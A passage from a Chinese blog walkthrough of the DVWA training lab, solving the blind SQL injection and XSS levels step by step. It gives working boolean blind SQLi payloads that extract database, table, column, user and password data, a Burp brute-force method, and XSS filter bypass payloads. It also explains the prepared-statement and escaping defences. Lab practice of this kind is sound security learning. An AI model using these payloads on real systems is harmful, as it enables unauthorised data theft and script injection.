+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702163500790.png" srcset="/img/loading.gif" lazyload alt="image-20210702163500790"></p>
+<p><strong>2.判断列数</strong></p>
+<p>3报错，所以列数为2.</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702163641113.png" srcset="/img/loading.gif" lazyload alt="image-20210702163641113"></p>
+<p>后面的操作和前面级别的操作并没有什么不同。</p>
+<p>很疑惑弄在两个页面有什么意义，查询了之后才得到了解答。</p>
+<blockquote>
+<p>High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入。</p>
+<p>因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
+</blockquote>
+<h2 id="4-impossible-5"><a href="#4-impossible-5" class="headerlink" title="4.impossible"></a><strong>4.impossible</strong></h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702170109179.png" srcset="/img/loading.gif" lazyload alt="image-20210702170109179"></p>
+<p> checktoken对token进行检查，防止crsf攻击。</p>
+<p>还使用了sql预编译，预编译语句的优势在于归纳为：<strong>一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止sql注入。</strong></p>
+<p>通俗来说，预编译就是提前做好了模板，用户进行的输入都是作为数据输入，不会进行任何逻辑操作。</p>
+<p>而且还限制了只允许返回一条数据。</p>
+<h1 id="八、SQL-Injection-Blind-（sql盲注）"><a href="#八、SQL-Injection-Blind-（sql盲注）" class="headerlink" title="八、SQL Injection (Blind) （sql盲注）"></a>八、SQL Injection (Blind) （sql盲注）</h1><h2 id="1-low-6"><a href="#1-low-6" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702172545641.png" srcset="/img/loading.gif" lazyload alt="image-20210702172545641"></p>
+<p>没有过滤。</p>
+<p>输入一个id号，只会有存在与否的提示，并没有数据的回显。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706112621857.png" srcset="/img/loading.gif" lazyload alt="image-20210706112621857"></p>
+<h3 id="（1）判断注入类型"><a href="#（1）判断注入类型" class="headerlink" title="（1）判断注入类型"></a><strong>（1）判断注入类型</strong></h3><p><code>1&#39; and &#39;1&#39;=&#39;1</code>显示id存在于数据库。</p>
+<p><code>1&#39; and &#39;1&#39;=&#39;2</code>显示id不存在于数据库。</p>
+<p>所以是字符型注入。</p>
+<p>判断列数：</p>
+<p><code>1&#39; order by 3#</code>时报错。</p>
+<p>说明列数为2.</p>
+<p>实际上这一项对用处不大，因为判断出了列数也无法查看回显位置。</p>
+<h3 id="（2）猜解数据库名长度"><a href="#（2）猜解数据库名长度" class="headerlink" title="（2）猜解数据库名长度"></a><strong>（2）猜解数据库名长度</strong></h3><p>使用length函数，猜解database的名字长度。当结果猜解正确，回显也会显示为真。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(database())=<span class="hljs-number">1</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>输入4时显示显示为真，所以名字长度为4.</p>
+<h3 id="（3）猜解数据库名"><a href="#（3）猜解数据库名" class="headerlink" title="（3）猜解数据库名"></a><strong>（3）猜解数据库名</strong></h3><p>一个一个对猜解数据库名，可以用到的函数有很多。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-meta">#left(从左侧截取database（）的前n位)</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left(database(),1)&gt;&#x27;</span>a<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">#ascii(两个1分别代表起始位和长度)，判断ascii码是否大于97</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span><br><br><span class="hljs-meta">#regexp正则表达</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select database()) regexp &#x27;</span>^a<span class="hljs-string">&#x27;#</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()) regexp <span class="hljs-string">&#x27;^dv&#x27;</span>#<br><br><span class="hljs-meta">#like，和regexp用法相似</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select database()) like &#x27;</span>dv%<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>一个个试太慢了，尝试用bp抓包爆破。</p>
+<p>*<strong>bp爆破</strong></p>
+<p>以left为例子，构造语句：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure>
+
+<p>抓包，send to intruder。</p>
+<p>设置类型为<strong>cluster bomb</strong>，设置爆破点（起始位和ascii数字）。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142332397.png" srcset="/img/loading.gif" lazyload alt="image-20210706142332397"></p>
+<p>payload1设置为number，由于之前猜解了长度为4，所以设置长度为4。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142419716.png" srcset="/img/loading.gif" lazyload alt="image-20210706142419716"></p>
+<p>payload2也设置为number类型，范围为97-122（a-z的ascii范围）。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142551875.png" srcset="/img/loading.gif" lazyload alt="image-20210706142551875"></p>
+<p>attack，状态码为200的就是每一位的正确字母。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142251420.png" srcset="/img/loading.gif" lazyload alt="image-20210706142251420"></p>
+<p>将数字转码，得到数据库名——dvwa。</p>
+<h3 id="（4）猜解表名"><a href="#（4）猜解表名" class="headerlink" title="（4）猜解表名"></a><strong>（4）猜解表名</strong></h3><p>和猜解数据库的方式相似。</p>
+<ul>
+<li><strong>先猜解有该数据库有几个表。</strong></li>
+</ul>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">count</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;dvwa&#x27;</span>)=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p>到2的时候显示为真，说明有两个表。</p>
+<ul>
+<li><strong>猜解表的长度</strong></li>
+</ul>
+<p>第一个表：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">length</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p>第二个表：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">length</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),2))</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p>测试后第一个表的长度为9，第二个表的长度为5.</p>
+<ul>
+<li><strong>猜解表的名字</strong></li>
+</ul>
+<p>第一个表：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706150211720.png" srcset="/img/loading.gif" lazyload alt="image-20210706150211720"></p>
+<p><strong>guestbook</strong>。</p>
+<p>第二个表：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">2</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706151158000.png" srcset="/img/loading.gif" lazyload alt="image-20210706151158000"></p>
+<p><strong>users</strong>。</p>
+<h3 id="（5）猜解字段名"><a href="#（5）猜解字段名" class="headerlink" title="（5）猜解字段名"></a><strong>（5）猜解字段名</strong></h3><p>和表名差别不大。</p>
+<p>查询users表字段个数。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">count</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p>查询的结果为8.</p>
+<p>剩下的一个个查太麻烦了，还是使用爆破吧，如果数据量不是特别大，直接爆破名字也是可行的。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706153554762.png" srcset="/img/loading.gif" lazyload alt="image-20210706153554762"></p>
+<p>结果为：<strong>user_id</strong>。</p>
+<p>第二个：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p>查询完所有的字段名为：</p>
+<p>user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
+<h3 id="（6）猜解用户名"><a href="#（6）猜解用户名" class="headerlink" title="（6）猜解用户名"></a><strong>（6）猜解用户名</strong></h3><p>第一个用户：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select user from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706154843388.png" srcset="/img/loading.gif" lazyload alt="image-20210706154843388"></p>
+<p><strong>admin</strong></p>
+<p>第二个用户：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select user from users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure>
+
+<p><strong>gordonb</strong></p>
+<p>就不一个一个试了。</p>
+<h3 id="（7）猜解密码"><a href="#（7）猜解密码" class="headerlink" title="（7）猜解密码"></a><strong>（7）猜解密码</strong></h3><p>猜解admin的密码，也就是password的表中的第一个。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select password from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure>
+
+<p>结果为admin。</p>
+<h2 id="2-medium-6"><a href="#2-medium-6" class="headerlink" title="2.medium"></a>2.medium</h2><p>界面：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160610549.png" srcset="/img/loading.gif" lazyload alt="image-20210706160610549"></p>
+<p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160533944.png" srcset="/img/loading.gif" lazyload alt="image-20210706160533944"></p>
+<p>post类型。</p>
+<p>bp抓包进行注入。</p>
+<p>测试后发现，为数字型注入。</p>
+<p>本身没有什么过滤，只要注意语句格式为数字型注入，还有单引号被过滤（和sql注入一样用十六进制绕过），其他没有什么不同。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160856446.png" srcset="/img/loading.gif" lazyload alt="image-20210706160856446"></p>
+<h2 id="3-high-6"><a href="#3-high-6" class="headerlink" title="3.high"></a>3.high</h2><p>界面：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161153872.png" srcset="/img/loading.gif" lazyload alt="image-20210706161153872"></p>
+<p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161221694.png" srcset="/img/loading.gif" lazyload alt="image-20210706161221694"></p>
+<p>只有随机sleep的限制。</p>
+<p>弹出对sqlmap起到了一定的限制。</p>
+<p>测试后为字符型注入，其他的操作和low级别并没有什么不同。</p>
+<h2 id="4-impossible-6"><a href="#4-impossible-6" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161852820.png" srcset="/img/loading.gif" lazyload alt="image-20210706161852820"></p>
+<p>同样和sql注入的impossible级别差别不大。</p>
+<p>获取token并验证，pdo机制，使用了sql预编译，数据每次只返回一条。</p>
+<p>暂时无方法绕过。</p>
+<h1 id="九、xss（reflected）反射型"><a href="#九、xss（reflected）反射型" class="headerlink" title="九、xss（reflected）反射型"></a>九、xss（reflected）反射型</h1><h2 id="1-low-7"><a href="#1-low-7" class="headerlink" title="1.low"></a>1.low</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702173105531.png" srcset="/img/loading.gif" lazyload alt="image-20210702173105531"></p>
+<p>输入name，输出name。</p>
+<p>没有任何过滤。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功弹出。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702173429626.png" srcset="/img/loading.gif" lazyload alt="image-20210702173429626"></p>
+<h2 id="2-medium-7"><a href="#2-medium-7" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702174437664.png" srcset="/img/loading.gif" lazyload alt="image-20210702174437664"></p>
+<p>使用str_replace限制了<code>&lt;script&gt;</code>标签。</p>
+<p>可以用<strong>其他标签</strong>进行代替。</p>
+<p>例如：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=alert(1)&gt;<br>&lt;img <span class="hljs-attribute">src</span>=0 <span class="hljs-attribute">onerror</span>=alert(&quot;xss&quot;)&gt;  <br></code></pre></td></tr></table></figure>
+
+<p>由于str_replace只进行一次转换，所以也可以使用<strong>双写绕过</strong>。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;sc<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ript&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175353915.png" srcset="/img/loading.gif" lazyload alt="image-20210702175353915"></p>
+<h2 id="3-high-7"><a href="#3-high-7" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175557494.png" srcset="/img/loading.gif" lazyload alt="image-20210702175557494"></p>
+<p>script标签的被过滤了。</p>
+<p>使用<strong>其他标签</strong>即可绕过。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175758750.png" srcset="/img/loading.gif" lazyload alt="image-20210702175758750"></p>
+<h2 id="4-impossible-7"><a href="#4-impossible-7" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702180030280.png" srcset="/img/loading.gif" lazyload alt="image-20210702180030280"></p>
+<p>htmlspecialchars — 将预定义的字符（**&amp;<strong>、</strong>“<strong>、</strong>‘<strong>、</strong>&lt;**、**&gt;**） 转换为 HTML 实体。</p>
+<p>也就意味着一些特殊的标签将无法生效。</p>
+<p>xss漏洞无法利用，但查询后发现也有绕过的可能性，例如htmlspecialchars未能奏效的场景（详见<a href="htmlspecialchars">知乎</a>）。但该方法对此场景未能生效。</p>
+<h1 id="十、xss（stored）存储型"><a href="#十、xss（stored）存储型" class="headerlink" title="十、xss（stored）存储型"></a>十、xss（stored）存储型</h1><h2 id="1-low-8"><a href="#1-low-8" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706102921672.png" srcset="/img/loading.gif" lazyload alt="image-20210706102921672"></p>
+<p>trim(string,charlist) ： 移除string字符两侧的预定义字符，预定义字符包括\t 、 \n 、\x0B 、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p>
+<p>stripslashes（）删除反斜杠。</p>
+<p>mysql_real_escape_string() 对特殊字符进行转义。</p>
+<p>实际上对输入的内容并没有进行xss过滤。</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/111/</span>)</span></span><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>;</span></span></span><br></code></pre></td></tr></table></figure>
+
+<p>每一次提交都会弹出窗口。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706104324274.png" srcset="/img/loading.gif" lazyload alt="image-20210706104324274"></p>
+<h2 id="2-medium-8"><a href="#2-medium-8" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706105010065.png" srcset="/img/loading.gif" lazyload alt="image-20210706105010065"></p>
+<p>addslashes() 函数返回在预定义字符（**&amp;<strong>、</strong>“<strong>、</strong>‘<strong>、</strong>&lt;**、**&gt;**） 之前添加反斜杠的字符串。</p>
+<p>strip_tag()删除字符串中的html标签。</p>
+<p>htmlspecialchars — 将预定义的字符转换为 HTML 实体。</p>
+<p>上传<code>alert(&#39;1&#39;)</code>,发现单引号被反斜杠过滤。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706105931652.png" srcset="/img/loading.gif" lazyload alt="image-20210706105931652"></p>
+<p>message过滤掉了所有的标签，但name只替换了script，而且过滤的是小写。</p>
+<p>尝试从name进行xss攻击（大小写），但name限制只能输入10个字符。</p>
+<p>f12打开查看器，修改<strong>maxlength</strong>。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111059697.png" srcset="/img/loading.gif" lazyload alt="image-20210706111059697"></p>
+<p>构造语句：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>攻击成功：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111159270.png" srcset="/img/loading.gif" lazyload alt="image-20210706111159270"></p>
+<h2 id="3-high-8"><a href="#3-high-8" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111247688.png" srcset="/img/loading.gif" lazyload alt="image-20210706111247688"></p>
+<p>name的script完全被过滤。</p>
+<p>使用其他标签进行攻击：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure>
+
+<p>其他的操作和medium基本一致。</p>
+<p>成功：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111555026.png" srcset="/img/loading.gif" lazyload alt="image-20210706111555026"></p>
+<h2 id="4-impossible-8"><a href="#4-impossible-8" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111658731.png" srcset="/img/loading.gif" lazyload alt="image-20210706111658731"></p>
+<p>需要获取和验证token，并添加了pdo机制。</p>
+<p>name也同样使用htmlspecialchars进行了过滤。</p>
+<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p>大佬很多，好文章很多，继续学习！</p>
+<p>使用docker搭建dvwa环境：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/126668420">https://zhuanlan.zhihu.com/p/126668420</a></p>
+<p>php函数参考：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/">https://www.w3school.com.cn/php/</a></p>
+<p>什么是token：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/24825a2683e6">https://www.jianshu.com/p/24825a2683e6</a></p>
+<p>burpsuit中attack的四种模式的区别：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012804180/article/details/52015224">https://blog.csdn.net/u012804180/article/details/52015224</a></p>
+<p>Web安全-命令执行漏洞：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000016056455">https://segmentfault.com/a/1190000016056455</a></p>
+<p>dvwa-csrf：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e65ede7d7026">https://www.jianshu.com/p/e65ede7d7026</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/82918141?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162495828916780265419802%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162495828916780265419802&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-82918141.pc_search_result_before_js&utm_term=dvwa+csrf&spm=1018.2226.3001.4187">DVWA之CSRF(跨站请求伪造攻击)</a></p>
+<p>dvwa 1.10 High等级的CSRF另类通关法：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/203301.html">https://www.freebuf.com/articles/web/203301.html</a></p>
+<p>Web安全实战系列：文件包含漏洞：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/182280.html">https://www.freebuf.com/articles/web/182280.html</a></p>
+<p>php伪协议总结：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
+<p>一步一步学习dvwa渗透测试：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/105549209">https://zhuanlan.zhihu.com/p/105549209</a></p>
+<p>sql预编译：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/micrari/p/7112781.html">https://www.cnblogs.com/micrari/p/7112781.html</a></p>
+<p>dvwa之xss：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/82935895">https://blog.csdn.net/qq_36119192/article/details/82935895</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%97%A7%E6%96%87%E7%AB%A0/">#旧文章</a>
+      
+        <a href="/tags/dvwa/">#dvwa</a>
+      
+        <a href="/tags/docker/">#docker</a>
+      
+        <a href="/tags/mac/">#mac</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DVWA全部分学习</div>
+      <div>http://example.com/2021/07/06/old/dvwa2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>咩包</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年7月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/31/old/%E7%94%A8beautifulsoup%E7%AE%80%E5%8D%95%E7%88%AC%E5%8F%96%E8%8B%B1%E8%AF%AD%E9%9F%B3%E9%A2%91/" title="用beautifulsoup简单爬取英语音频">
